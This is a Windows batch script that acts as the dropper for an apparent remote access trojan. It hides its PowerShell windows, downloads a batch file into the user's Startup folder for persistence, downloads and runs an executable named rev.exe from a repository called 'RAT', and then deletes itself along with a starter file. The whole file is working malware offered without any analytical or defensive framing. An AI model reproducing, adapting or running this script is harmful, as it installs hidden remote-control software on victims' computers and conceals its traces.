@echo off
del Starter.bat
set "currentd=%cd%"
cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
powershell -windowstyle hidden curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
cd %currentd%
powershell -windowstyle hidden curl -o rev.exe https://raw.githubusercontent.com/saifnasef/RAT/main/rev.exe
rev.exe
del "%~f0"
